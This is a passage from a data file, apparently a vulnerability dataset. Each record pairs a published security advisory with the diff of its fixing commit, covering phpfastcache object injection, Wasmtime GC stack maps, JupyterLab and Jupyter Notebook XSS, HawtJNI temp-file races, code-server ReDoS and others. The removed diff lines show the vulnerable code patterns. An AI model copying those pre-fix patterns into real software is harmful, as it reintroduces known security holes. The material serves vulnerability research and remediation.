update","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['backend\/Services\/Auth\/Adapters\/JsonFile.php'])","num_files":1.0},{"index":381,"vuln_id":"GHSA-484f-743f-6jx2","cwe_id":"{'CWE-94'}","score":4.4,"chain":"{'https:\/\/github.com\/PHPSocialNetwork\/phpfastcache\/commit\/c4527205cb7a402b595790c74310791f5b04a1a4'}","dataset":"osv","summary":"Object injection in cookie driver in phpfastcache ### Impact\nAn possible object injection has been discovered in cookie driver prior 5.0.13 versions (of 5.x releases).\n\n### Patches\nThe issue has been addressed by enforcing JSON conversion when deserializing\n\n### Workarounds\nIf you can't fix it, use another driver such as \"Files\" (Filesystem)\n\n### References\nFixing release: https:\/\/github.com\/PHPSocialNetwork\/phpfastcache\/releases\/tag\/5.0.13\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the issue tracker](https:\/\/github.com\/PHPSocialNetwork\/phpfastcache\/issues)\n* Email us at [security@geolim4.com](mailto:security@geolim4.com)","published_date":"2019-12-12","chain_len":1,"project":"https:\/\/github.com\/PHPSocialNetwork\/phpfastcache","commit_href":"https:\/\/github.com\/PHPSocialNetwork\/phpfastcache\/commit\/c4527205cb7a402b595790c74310791f5b04a1a4","commit_sha":"c4527205cb7a402b595790c74310791f5b04a1a4","patch":"SINGLE","chain_ord":"['c4527205cb7a402b595790c74310791f5b04a1a4']","before_first_fix_commit":"{'afb1d158aee1eaa07857909d43f6ce3570b82a30'}","last_fix_commit":"c4527205cb7a402b595790c74310791f5b04a1a4","chain_ord_pos":1.0,"commit_datetime":"12\/30\/2016, 08:40:00","message":"Fixed critical vulnerability on cookie driver","author":"Geolim4","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/phpFastCache\/Drivers\/Cookie\/Driver.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/PHPSocialNetwork\/phpfastcache\/raw\/c4527205cb7a402b595790c74310791f5b04a1a4\/src%2FphpFastCache%2FDrivers%2FCookie%2FDriver.php', 'patch': '@@ -99,7 +99,7 @@ protected function driverRead(CacheItemInterface $item)\\n         \/\/ return null if no caching\\n         \/\/ return value if in caching\\n         $keyword = self::PREFIX . $item->getKey();\\n-        $x = isset($_COOKIE[ $keyword ]) ? $this->decode(json_decode($_COOKIE[ $keyword ], true)) : false;\\n+        $x = isset($_COOKIE[ $keyword ]) ? json_decode($_COOKIE[ $keyword ], true) : false;\\n \\n         if ($x == false) {\\n             return null;'}}","message_norm":"fixed critical vulnerability on cookie driver","language":"en","entities":"[('fixed', 'ACTION', ''), ('critical', 'SEVERITY', ''), ('vulnerability', 'SECWORD', ''), ('cookie', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/phpFastCache\/Drivers\/Cookie\/Driver.php'])","num_files":1.0},{"index":383,"vuln_id":"GHSA-4873-36h9-wv49","cwe_id":"{'CWE-787', 'CWE-125', 'CWE-590'}","score":6.3,"chain":"{'https:\/\/github.com\/bytecodealliance\/wasmtime\/commit\/398a73f0dd862dbe703212ebae8e34036a18c11c'}","dataset":"osv","summary":"Out-of-bounds read\/write and invalid free with `externref`s and GC safepoints in Wasmtime  ### Impact\n\nThere was an invalid free and out-of-bounds read and write bug when running Wasm that uses `externref`s in Wasmtime.\n\nTo trigger this bug, Wasmtime needs to be running Wasm that uses `externref`s, the host creates non-null `externrefs`, Wasmtime performs a garbage collection (GC), and there has to be a Wasm frame on the stack that is at a GC safepoint where\n\n* there are no live references at this safepoint, and\n* there is a safepoint with live references earlier in this frame's function.\n\nUnder this scenario, Wasmtime would incorrectly use the GC stack map for the safepoint from earlier in the function instead of the empty safepoint. This would result in Wasmtime treating arbitrary stack slots as `externref`s that needed to be rooted for GC. At the *next* GC, it would be determined that nothing was referencing these bogus `externref`s (because nothing could ever reference them, because they are not really `externref`s) and then Wasmtime would deallocate them and run `<ExternRef as Drop>::drop` on them. This results in a free of memory that is not necessarily on the heap (and shouldn't be freed at this moment even if it was), as well as potential out-of-bounds reads and writes.\n\nEven though support for `externref`s (via the reference types proposal) is enabled by default, unless you are creating non-null `externref`s in your host code or explicitly triggering GCs, you cannot be affected by this bug.\n\nWe have reason to believe that the effective impact of this bug is relatively small because usage of `externref` is currently quite rare.\n\n### Patches\n\nThis bug has been patched and users should upgrade to Wasmtime version 0.30.0.\n\nAdditionally, we have updated [our primary `externref` fuzz target](https:\/\/github.com\/bytecodealliance\/wasmtime\/blob\/37c094faf53f1b356aab3c79d451395e4f7edb34\/fuzz\/fuzz_targets\/table_ops.rs) such that it better exercises these code paths and we can have greater confidence in their correctness going forward.\n\n### Workarounds\n\nIf you cannot upgrade Wasmtime at this time, you can avoid this bug by disabling the reference types proposal by passing `false` to [`wasmtime::Config::wasm_reference_types`](https:\/\/docs.rs\/wasmtime\/0.29.0\/wasmtime\/struct.Config.html#method.wasm_reference_types)\n\n### References\n\n* [The Wasm reference types proposal, which introduces `externref`](https:\/\/github.com\/WebAssembly\/reference-types\/)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to us on [the Bytecode Alliance Zulip chat](https:\/\/bytecodealliance.zulipchat.com\/#narrow\/stream\/217126-wasmtime)\n* Open an issue in [the `bytecodealliance\/wasmtime` repository](https:\/\/github.com\/bytecodealliance\/wasmtime\/)","published_date":"2021-09-20","chain_len":1,"project":"https:\/\/github.com\/bytecodealliance\/wasmtime","commit_href":"https:\/\/github.com\/bytecodealliance\/wasmtime\/commit\/398a73f0dd862dbe703212ebae8e34036a18c11c","commit_sha":"398a73f0dd862dbe703212ebae8e34036a18c11c","patch":"SINGLE","chain_ord":"['398a73f0dd862dbe703212ebae8e34036a18c11c']","before_first_fix_commit":"{'ec4e48d4cbc28bcfd99e25842a90704e765b800f', '101998733b74624cbd348a2366d05760b40181f3'}","last_fix_commit":"398a73f0dd862dbe703212ebae8e34036a18c11c","chain_ord_pos":1.0,"commit_datetime":"09\/17\/2021, 17:28:50","message":"Merge pull request from GHSA-4873-36h9-wv49\n\nStop doing fuzzy search for stack maps","author":"Nick Fitzgerald","comments":null,"stats":"{'additions': 52, 'deletions': 48, 'total': 100}","files":"{'crates\/wasmtime\/src\/module\/registry.rs': {'additions': 52, 'deletions': 48, 'changes': 100, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bytecodealliance\/wasmtime\/raw\/398a73f0dd862dbe703212ebae8e34036a18c11c\/crates%2Fwasmtime%2Fsrc%2Fmodule%2Fregistry.rs', 'patch': '@@ -122,61 +122,65 @@ impl ModuleInfo for RegisteredModule {\\n         let info = self.module.func_info(index);\\n \\n         \/\/ Do a binary search to find the stack map for the given offset.\\n-        \/\/\\n-        \/\/ Because GC safepoints are technically only associated with a single\\n-        \/\/ PC, we should ideally only care about `Ok(index)` values returned\\n-        \/\/ from the binary search. However, safepoints are inserted right before\\n-        \/\/ calls, and there are two things that can disturb the PC\/offset\\n-        \/\/ associated with the safepoint versus the PC we actually use to query\\n-        \/\/ for the stack map:\\n-        \/\/\\n-        \/\/ 1. The `backtrace` crate gives us the PC in a frame that will be\\n-        \/\/    *returned to*, and where execution will continue from, rather than\\n-        \/\/    the PC of the call we are currently at. So we would need to\\n-        \/\/    disassemble one instruction backwards to query the actual PC for\\n-        \/\/    the stack map.\\n-        \/\/\\n-        \/\/    TODO: One thing we *could* do to make this a little less error\\n-        \/\/    prone, would be to assert\/check that the nearest GC safepoint\\n-        \/\/    found is within `max_encoded_size(any kind of call instruction)`\\n-        \/\/    our queried PC for the target architecture.\\n-        \/\/\\n-        \/\/ 2. Cranelift\\'s stack maps only handle the stack, not\\n-        \/\/    registers. However, some references that are arguments to a call\\n-        \/\/    may need to be in registers. In these cases, what Cranelift will\\n-        \/\/    do is:\\n-        \/\/\\n-        \/\/      a. spill all the live references,\\n-        \/\/      b. insert a GC safepoint for those references,\\n-        \/\/      c. reload the references into registers, and finally\\n-        \/\/      d. make the call.\\n-        \/\/\\n-        \/\/    Step (c) adds drift between the GC safepoint and the location of\\n-        \/\/    the call, which is where we actually walk the stack frame and\\n-        \/\/    collect its live references.\\n-        \/\/\\n-        \/\/    Luckily, the spill stack slots for the live references are still\\n-        \/\/    up to date, so we can still find all the on-stack roots.\\n-        \/\/    Furthermore, we do not have a moving GC, so we don\\'t need to worry\\n-        \/\/    whether the following code will reuse the references in registers\\n-        \/\/    (which would not have been updated to point to the moved objects)\\n-        \/\/    or reload from the stack slots (which would have been updated to\\n-        \/\/    point to the moved objects).\\n-\\n         let index = match info\\n             .stack_maps\\n             .binary_search_by_key(&func_offset, |i| i.code_offset)\\n         {\\n-            \/\/ Exact hit.\\n+            \/\/ Found it.\\n             Ok(i) => i,\\n \\n-            \/\/ `Err(0)` means that the associated stack map would have been the\\n-            \/\/ first element in the array if this pc had an associated stack\\n-            \/\/ map, but this pc does not have an associated stack map. This can\\n-            \/\/ only happen inside a Wasm frame if there are no live refs at this\\n-            \/\/ pc.\\n+            \/\/ No stack map associated with this PC.\\n+            \/\/\\n+            \/\/ Because we know we are in Wasm code, and we must be at some kind\\n+            \/\/ of call\/safepoint, then the Cranelift backend must have avoided\\n+            \/\/ emitting a stack map for this location because no refs were live.\\n+            #[cfg(not(feature = \"old-x86-backend\"))]\\n+            Err(_) => return None,\\n+\\n+            \/\/ ### Old x86_64 backend specific code.\\n+            \/\/\\n+            \/\/ Because GC safepoints are technically only associated with a\\n+            \/\/ single PC, we should ideally only care about `Ok(index)` values\\n+            \/\/ returned from the binary search. However, safepoints are inserted\\n+            \/\/ right before calls, and there are two things that can disturb the\\n+            \/\/ PC\/offset associated with the safepoint versus the PC we actually\\n+            \/\/ use to query for the stack map:\\n+            \/\/\\n+            \/\/ 1. The `backtrace` crate gives us the PC in a frame that will be\\n+            \/\/    *returned to*, and where execution will continue from, rather than\\n+            \/\/    the PC of the call we are currently at. So we would need to\\n+            \/\/    disassemble one instruction backwards to query the actual PC for\\n+            \/\/    the stack map.\\n+            \/\/\\n+            \/\/    TODO: One thing we *could* do to make this a little less error\\n+            \/\/    prone, would be to assert\/check that the nearest GC safepoint\\n+            \/\/    found is within `max_encoded_size(any kind of call instruction)`\\n+            \/\/    our queried PC for the target architecture.\\n+            \/\/\\n+            \/\/ 2. Cranelift\\'s stack maps only handle the stack, not\\n+            \/\/    registers. However, some references that are arguments to a call\\n+            \/\/    may need to be in registers. In these cases, what Cranelift will\\n+            \/\/    do is:\\n+            \/\/\\n+            \/\/      a. spill all the live references,\\n+            \/\/      b. insert a GC safepoint for those references,\\n+            \/\/      c. reload the references into registers, and finally\\n+            \/\/      d. make the call.\\n+            \/\/\\n+            \/\/    Step (c) adds drift between the GC safepoint and the location of\\n+            \/\/    the call, which is where we actually walk the stack frame and\\n+            \/\/    collect its live references.\\n+            \/\/\\n+            \/\/    Luckily, the spill stack slots for the live references are still\\n+            \/\/    up to date, so we can still find all the on-stack roots.\\n+            \/\/    Furthermore, we do not have a moving GC, so we don\\'t need to worry\\n+            \/\/    whether the following code will reuse the references in registers\\n+            \/\/    (which would not have been updated to point to the moved objects)\\n+            \/\/    or reload from the stack slots (which would have been updated to\\n+            \/\/    point to the moved objects).\\n+            #[cfg(feature = \"old-x86-backend\")]\\n             Err(0) => return None,\\n-\\n+            #[cfg(feature = \"old-x86-backend\")]\\n             Err(i) => i - 1,\\n         };'}}","message_norm":"merge pull request from ghsa-4873-36h9-wv49\n\nstop doing fuzzy search for stack maps","language":"en","entities":"[('ghsa-4873-36h9-wv49', 'VULNID', 'GHSA'), ('fuzzy', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['crates\/wasmtime\/src\/module\/registry.rs'])","num_files":1.0},{"index":385,"vuln_id":"GHSA-48mj-p7x2-5jfm","cwe_id":"{'CWE-306'}","score":7.5,"chain":"{'https:\/\/github.com\/esphome\/esphome\/pull\/2409\/commits\/207cde1667d8c799a197b78ca8a5a14de8d5ca1e', 'https:\/\/github.com\/esphome\/esphome\/commit\/be965a60eba6bb769e2a5afdbc8eed132f077a59'}","dataset":"osv","summary":"Basic auth bypass in esphome ### Impact\n\nAnyone with web_server enabled and HTTP basic auth configured on 2021.9.1 or older\n\n`web_server` allows OTA update without checking user defined basic auth username & password\n\n### Patches\n\nPatch released in 2021.9.2\n\n### Workarounds\n\nDisable\/remove `web_server`","published_date":"2021-09-29","chain_len":2,"project":"https:\/\/github.com\/esphome\/esphome","commit_href":"https:\/\/github.com\/esphome\/esphome\/pull\/2409\/commits\/207cde1667d8c799a197b78ca8a5a14de8d5ca1e","commit_sha":"207cde1667d8c799a197b78ca8a5a14de8d5ca1e","patch":"MULTI","chain_ord":"['be965a60eba6bb769e2a5afdbc8eed132f077a59', '207cde1667d8c799a197b78ca8a5a14de8d5ca1e']","before_first_fix_commit":"{'be965a60eba6bb769e2a5afdbc8eed132f077a59'}","last_fix_commit":"207cde1667d8c799a197b78ca8a5a14de8d5ca1e","chain_ord_pos":2.0,"commit_datetime":"09\/28\/2021, 01:02:04","message":"Fix lint issues in web_server_base","author":"Jesse Hills","comments":null,"stats":"{'additions': 3, 'deletions': 2, 'total': 5}","files":"{'esphome\/components\/web_server_base\/web_server_base.h': {'additions': 3, 'deletions': 2, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/esphome\/esphome\/raw\/207cde1667d8c799a197b78ca8a5a14de8d5ca1e\/esphome%2Fcomponents%2Fweb_server_base%2Fweb_server_base.h', 'patch': '@@ -3,6 +3,7 @@\\n #ifdef USE_ARDUINO\\n \\n #include <memory>\\n+#include <utility>\\n #include \"esphome\/core\/component.h\"\\n \\n #include <ESPAsyncWebServer.h>\\n@@ -96,8 +97,8 @@ class WebServerBase : public Component {\\n   std::shared_ptr<AsyncWebServer> get_server() const { return server_; }\\n   float get_setup_priority() const override;\\n \\n-  void set_auth_username(std::string auth_username) { credentials_.username = auth_username; }\\n-  void set_auth_password(std::string auth_password) { credentials_.password = auth_password; }\\n+  void set_auth_username(std::string auth_username) { credentials_.username = std::move(auth_username); }\\n+  void set_auth_password(std::string auth_password) { credentials_.password = std::move(auth_password); }\\n \\n   void add_handler(AsyncWebHandler *handler);'}}","message_norm":"fix lint issues in web_server_base","language":"en","entities":"[('fix', 'ACTION', ''), ('issues', 'FLAW', ''), ('web_server_base', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['esphome\/components\/web_server_base\/web_server_base.h'])","num_files":1.0},{"index":389,"vuln_id":"GHSA-4952-p58q-6crx","cwe_id":"{'CWE-87', 'CWE-79', 'CWE-75'}","score":7.4,"chain":"{'https:\/\/github.com\/jupyterlab\/jupyterlab\/commit\/504825938c0abfa2fb8ff8d529308830a5ae42ed'}","dataset":"osv","summary":"JupyterLab: XSS due to lack of sanitization of the action attribute of an html <form> ### Impact\n\nUntrusted notebook can execute code on load. This is a remote code execution, but requires user action to open a notebook.\n\n### Patches\n\nPatched in the following versions: 3.1.4, 3.0.17, 2.3.2, 2.2.10, 1.2.21.\n\n### References\n\n[OWASP Page on Restricting Form Submissions](https:\/\/cheatsheetseries.owasp.org\/cheatsheets\/Content_Security_Policy_Cheat_Sheet.html)\n\n### For more information\n\nIf you have any questions or comments about this advisory, or vulnerabilities to report, please email our security list security@ipython.org.\n\nCredit: Guillaume Jeanne from Google","published_date":"2021-08-23","chain_len":1,"project":"https:\/\/github.com\/jupyterlab\/jupyterlab","commit_href":"https:\/\/github.com\/jupyterlab\/jupyterlab\/commit\/504825938c0abfa2fb8ff8d529308830a5ae42ed","commit_sha":"504825938c0abfa2fb8ff8d529308830a5ae42ed","patch":"SINGLE","chain_ord":"['504825938c0abfa2fb8ff8d529308830a5ae42ed']","before_first_fix_commit":"{'ccb65656e3ed9c47d3e6fedbcff2405885d0bcaa'}","last_fix_commit":"504825938c0abfa2fb8ff8d529308830a5ae42ed","chain_ord_pos":1.0,"commit_datetime":"08\/05\/2021, 16:42:03","message":"Merge pull request from GHSA-4952-p58q-6crx\n\nRemove `form` tags' `action` attribute during sanitizing.\n\nCo-authored-by: Afshin Taylor Darian <git@darian.af>","author":"Steven Silvester","comments":null,"stats":"{'additions': 0, 'deletions': 1, 'total': 1}","files":"{'packages\/apputils\/src\/sanitizer.ts': {'additions': 0, 'deletions': 1, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jupyterlab\/jupyterlab\/raw\/504825938c0abfa2fb8ff8d529308830a5ae42ed\/packages%2Fapputils%2Fsrc%2Fsanitizer.ts', 'patch': \"@@ -624,7 +624,6 @@ export class Sanitizer implements ISanitizer {\\n       font: ['color', 'face', 'size'],\\n       form: [\\n         'accept',\\n-        'action',\\n         'autocomplete',\\n         'enctype',\\n         'method',\"}}","message_norm":"merge pull request from ghsa-4952-p58q-6crx\n\nremove `form` tags' `action` attribute during sanitizing.\n\nco-authored-by: afshin taylor darian <git@darian.af>","language":"en","entities":"[('ghsa-4952-p58q-6crx', 'VULNID', 'GHSA'), ('remove', 'ACTION', ''), ('sanitizing', 'SECWORD', ''), ('git@darian.af', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['packages\/apputils\/src\/sanitizer.ts'])","num_files":1.0},{"index":390,"vuln_id":"GHSA-49j7-qghp-5wj8","cwe_id":"{'CWE-94'}","score":0.0,"chain":"{'https:\/\/github.com\/fusesource\/hawtjni\/commit\/92c266170ce98edc200c656bd034a237098b8aa5'}","dataset":"osv","summary":"Improper Control of Generation of Code in HawtJNI Race condition in hawtjni-runtime\/src\/main\/java\/org\/fusesource\/hawtjni\/runtime\/Library.java in HawtJNI before 1.8, when a custom library path is not specified, allows local users to execute arbitrary Java code by overwriting a temporary JAR file with a predictable name in \/tmp.","published_date":"2022-05-17","chain_len":1,"project":"https:\/\/github.com\/fusesource\/hawtjni","commit_href":"https:\/\/github.com\/fusesource\/hawtjni\/commit\/92c266170ce98edc200c656bd034a237098b8aa5","commit_sha":"92c266170ce98edc200c656bd034a237098b8aa5","patch":"SINGLE","chain_ord":"['92c266170ce98edc200c656bd034a237098b8aa5']","before_first_fix_commit":"{'357bb279b0c8c67b7d357c1363efe86870ad9a81'}","last_fix_commit":"92c266170ce98edc200c656bd034a237098b8aa5","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2013, 13:49:55","message":"Simplify shared lib extraction.","author":"Hiram Chirino","comments":null,"stats":"{'additions': 29, 'deletions': 50, 'total': 79}","files":"{'hawtjni-runtime\/src\/main\/java\/org\/fusesource\/hawtjni\/runtime\/Library.java': {'additions': 29, 'deletions': 50, 'changes': 79, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/fusesource\/hawtjni\/raw\/92c266170ce98edc200c656bd034a237098b8aa5\/hawtjni-runtime%2Fsrc%2Fmain%2Fjava%2Forg%2Ffusesource%2Fhawtjni%2Fruntime%2FLibrary.java', 'patch': '@@ -9,13 +9,11 @@\\n  *******************************************************************************\/\\n package org.fusesource.hawtjni.runtime;\\n \\n-import java.io.File;\\n-import java.io.FileOutputStream;\\n-import java.io.IOException;\\n-import java.io.InputStream;\\n+import java.io.*;\\n import java.net.MalformedURLException;\\n import java.net.URL;\\n import java.util.ArrayList;\\n+import java.util.Random;\\n import java.util.regex.Pattern;\\n \\n \/**\\n@@ -206,16 +204,19 @@ final public String getLibraryFileName() {\\n     private boolean exractAndLoad(ArrayList<String> errors, String version, String customPath, String resourcePath) {\\n         URL resource = classLoader.getResource(resourcePath);\\n         if( resource !=null ) {\\n-            \\n+\\n             String libName = name + \"-\" + getBitModel();\\n             if( version !=null) {\\n                 libName += \"-\" + version;\\n             }\\n-            \\n+            String []libNameParts = map(libName).split(\"\\\\\\\\.\");\\n+            String prefix = libNameParts[0]+\"-\";\\n+            String suffix = \".\"+libNameParts[1];\\n+\\n             if( customPath!=null ) {\\n                 \/\/ Try to extract it to the custom path...\\n-                File target = file(customPath, map(libName));\\n-                if( extract(errors, resource, target) ) {\\n+                File target = extract(errors, resource, prefix, suffix, file(customPath));\\n+                if( target!=null ) {\\n                     if( load(errors, target) ) {\\n                         return true;\\n                     }\\n@@ -224,8 +225,8 @@ private boolean exractAndLoad(ArrayList<String> errors, String version, String c\\n             \\n             \/\/ Fall back to extracting to the tmp dir\\n             customPath = System.getProperty(\"java.io.tmpdir\");\\n-            File target = file(customPath, map(libName));\\n-            if( extract(errors, resource, target) ) {\\n+            File target = extract(errors, resource, prefix, suffix, file(customPath));\\n+            if( target!=null ) {\\n                 if( load(errors, target) ) {\\n                     return true;\\n                 }\\n@@ -259,67 +260,45 @@ private String map(String libName) {\\n         return libName;\\n     }\\n \\n-    private boolean extract(ArrayList<String> errors, URL source, File target) {\\n-        FileOutputStream os = null;\\n-        InputStream is = null;\\n-        boolean extracting = false;\\n+    private File extract(ArrayList<String> errors, URL source, String prefix, String suffix, File directory) {\\n+        File target = null;\\n         try {\\n-            if (!target.exists() || isStale(source, target) ) {\\n+            FileOutputStream os = null;\\n+            InputStream is = null;\\n+            try {\\n+                target = File.createTempFile(prefix, suffix, directory);\\n                 is = source.openStream();\\n                 if (is != null) {\\n                     byte[] buffer = new byte[4096];\\n                     os = new FileOutputStream(target);\\n-                    extracting = true;\\n                     int read;\\n                     while ((read = is.read(buffer)) != -1) {\\n                         os.write(buffer, 0, read);\\n                     }\\n-                    os.close();\\n-                    is.close();\\n                     chmod(\"755\", target);\\n                 }\\n+                target.deleteOnExit();\\n+                return target;\\n+            } finally {\\n+                close(os);\\n+                close(is);\\n             }\\n         } catch (Throwable e) {\\n-            try {\\n-                if (os != null)\\n-                    os.close();\\n-            } catch (IOException e1) {\\n-            }\\n-            try {\\n-                if (is != null)\\n-                    is.close();\\n-            } catch (IOException e1) {\\n-            }\\n-            if (extracting && target.exists())\\n+            if( target!=null ) {\\n                 target.delete();\\n+            }\\n             errors.add(e.getMessage());\\n-            return false;\\n         }\\n-        return true;\\n+        return null;\\n     }\\n \\n-    private boolean isStale(URL source, File target) {\\n-        \\n-        if( source.getProtocol().equals(\"jar\") ) {\\n-            \/\/ unwrap the jar protocol...\\n+    static private void close(Closeable file) {\\n+        if(file!=null) {\\n             try {\\n-                String parts[] = source.getFile().split(Pattern.quote(\"!\"));\\n-                source = new URL(parts[0]);\\n-            } catch (MalformedURLException e) {\\n-                return false;\\n-            }\\n-        }\\n-        \\n-        File sourceFile=null;\\n-        if( source.getProtocol().equals(\"file\") ) {\\n-            sourceFile = new File(source.getFile());\\n-        }\\n-        if( sourceFile!=null && sourceFile.exists() ) {\\n-            if( sourceFile.lastModified() > target.lastModified() ) {\\n-                return true;\\n+                file.close();\\n+            } catch (Exception ignore) {\\n             }\\n         }\\n-        return false;\\n     }\\n \\n     private void chmod(String permision, File path) {'}}","message_norm":"simplify shared lib extraction.","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['hawtjni-runtime\/src\/main\/java\/org\/fusesource\/hawtjni\/runtime\/Library.java'])","num_files":1.0},{"index":394,"vuln_id":"GHSA-49qr-xh3w-h436","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/jupyter\/notebook\/commit\/107a89fce5f413fb5728c1c5d2c7788e1fb17491'}","dataset":"osv","summary":"Moderate severity vulnerability that affects notebook Jupyter Notebook before 5.7.1 allows XSS via an untrusted notebook because nbconvert responses are considered to have the same origin as the notebook server. In other words, nbconvert endpoints can execute JavaScript with access to the server API. In notebook\/nbconvert\/handlers.py, NbconvertFileHandler and NbconvertPostHandler do not set a Content Security Policy to prevent this.","published_date":"2018-11-21","chain_len":1,"project":"https:\/\/github.com\/jupyter\/notebook","commit_href":"https:\/\/github.com\/jupyter\/notebook\/commit\/107a89fce5f413fb5728c1c5d2c7788e1fb17491","commit_sha":"107a89fce5f413fb5728c1c5d2c7788e1fb17491","patch":"SINGLE","chain_ord":"['107a89fce5f413fb5728c1c5d2c7788e1fb17491']","before_first_fix_commit":"{'04a686dbaf9dfe553324a03cb9e6f778cf1e3da1'}","last_fix_commit":"107a89fce5f413fb5728c1c5d2c7788e1fb17491","chain_ord_pos":1.0,"commit_datetime":"10\/22\/2018, 13:52:36","message":"Apply CSP sandboxing for nbconvert responses\n\nThese may contain untrusted content, so they should be treated as being\nfrom a different domain to the notebook server.","author":"Thomas Kluyver","comments":null,"stats":"{'additions': 14, 'deletions': 0, 'total': 14}","files":"{'notebook\/nbconvert\/handlers.py': {'additions': 14, 'deletions': 0, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jupyter\/notebook\/raw\/107a89fce5f413fb5728c1c5d2c7788e1fb17491\/notebook%2Fnbconvert%2Fhandlers.py', 'patch': '@@ -78,6 +78,13 @@ class NbconvertFileHandler(IPythonHandler):\\n \\n     SUPPORTED_METHODS = (\\'GET\\',)\\n \\n+    @property\\n+    def content_security_policy(self):\\n+        # In case we\\'re serving HTML\/SVG, confine any Javascript to a unique\\n+        # origin so it can\\'t interact with the notebook server.\\n+        return super(NbconvertFileHandler, self).content_security_policy + \\\\\\n+               \"; sandbox allow-scripts\"\\n+\\n     @web.authenticated\\n     def get(self, format, path):\\n \\n@@ -145,6 +152,13 @@ def get(self, format, path):\\n class NbconvertPostHandler(IPythonHandler):\\n     SUPPORTED_METHODS = (\\'POST\\',)\\n \\n+    @property\\n+    def content_security_policy(self):\\n+        # In case we\\'re serving HTML\/SVG, confine any Javascript to a unique\\n+        # origin so it can\\'t interact with the notebook server.\\n+        return super(NbconvertPostHandler, self).content_security_policy + \\\\\\n+               \"; sandbox allow-scripts\"\\n+\\n     @web.authenticated\\n     def post(self, format):\\n         exporter = get_exporter(format, config=self.config)'}}","message_norm":"apply csp sandboxing for nbconvert responses\n\nthese may contain untrusted content, so they should be treated as being\nfrom a different domain to the notebook server.","language":"en","entities":"[('untrusted', 'SECWORD', ''), ('server', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['notebook\/nbconvert\/handlers.py'])","num_files":1.0},{"index":399,"vuln_id":"GHSA-49x3-8228-3w3m","cwe_id":"{'CWE-1333'}","score":7.5,"chain":"{'https:\/\/github.com\/cdr\/code-server\/commit\/ca617df135e78833f93c8320cb2d2cf8bba809f5'}","dataset":"osv","summary":"Inefficient Regular Expression Complexity in code-server code-server is vulnerable to Inefficient Regular Expression Complexity","published_date":"2021-09-20","chain_len":1,"project":"https:\/\/github.com\/cdr\/code-server","commit_href":"https:\/\/github.com\/cdr\/code-server\/commit\/ca617df135e78833f93c8320cb2d2cf8bba809f5","commit_sha":"ca617df135e78833f93c8320cb2d2cf8bba809f5","patch":"SINGLE","chain_ord":"['ca617df135e78833f93c8320cb2d2cf8bba809f5']","before_first_fix_commit":"{'bc3acb071e5393944627e16b2b54dc296a17d2d6'}","last_fix_commit":"ca617df135e78833f93c8320cb2d2cf8bba809f5","chain_ord_pos":1.0,"commit_datetime":"09\/11\/2021, 13:10:47","message":"[Security] Fix ReDoS\n\nFix potential ReDoS","author":"ready-research","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/node\/util.ts': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/coder\/code-server\/raw\/ca617df135e78833f93c8320cb2d2cf8bba809f5\/src%2Fnode%2Futil.ts', 'patch': '@@ -20,7 +20,7 @@ export interface Paths {\\n \\n \/\/ From https:\/\/github.com\/chalk\/ansi-regex\\n const pattern = [\\n-  \"[\\\\\\\\u001B\\\\\\\\u009B][[\\\\\\\\]()#;?]*(?:(?:(?:[a-zA-Z\\\\\\\\d]*(?:;[-a-zA-Z\\\\\\\\d\\\\\\\\\/#&.:=?%@~_]*)*)?\\\\\\\\u0007)\",\\n+  \"[\\\\\\\\u001B\\\\\\\\u009B][[\\\\\\\\]()#;?]*(?:(?:(?:(?:;[-a-zA-Z\\\\\\\\d\\\\\\\\\/#&.:=?%@~_]+)*|[a-zA-Z\\\\\\\\d]+(?:;[-a-zA-Z\\\\\\\\d\\\\\\\\\/#&.:=?%@~_]*)*)?\\\\\\\\u0007)\",\\n   \"(?:(?:\\\\\\\\d{1,4}(?:;\\\\\\\\d{0,4})*)?[\\\\\\\\dA-PR-TZcf-ntqry=><~]))\",\\n ].join(\"|\")\\n const re = new RegExp(pattern, \"g\")'}}","message_norm":"[security] fix redos\n\nfix potential redos","language":"es","entities":"[('security', 'SECWORD', ''), ('fix', 'ACTION', ''), ('redos', 'SECWORD', ''), ('fix', 'ACTION', ''), ('redos', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/node\/util.ts'])","num_files":1.0},{"index":400,"vuln_id":"GHSA-4c4g-crqm-xrxw","cwe_id":"{'CWE-908'}","score":4.4,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4a91f2069f7145aab6ba2d8cfe41be8a110c18a5', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8933b8a21280696ab119b63263babdb54c298538', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/537bc7c723439b9194a358f64d871dd326c18887'}","dataset":"osv","summary":"Use of unitialized value in TFLite ### Impact\nAll TFLite operations that use quantization can be made to use unitialized values. [For example](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/lite\/kernels\/depthwise_conv.cc#L198-L200):\n\n```cc\n    const auto* affine_quantization =\n        reinterpret_cast<TfLiteAffineQuantization*>(\n            filter->quantization.params);\n```\n\nThe issue stems from the fact that `quantization.params` is only valid if `quantization.type` is different that `kTfLiteNoQuantization`. However, these checks are missing in large parts of the code.\n\n### 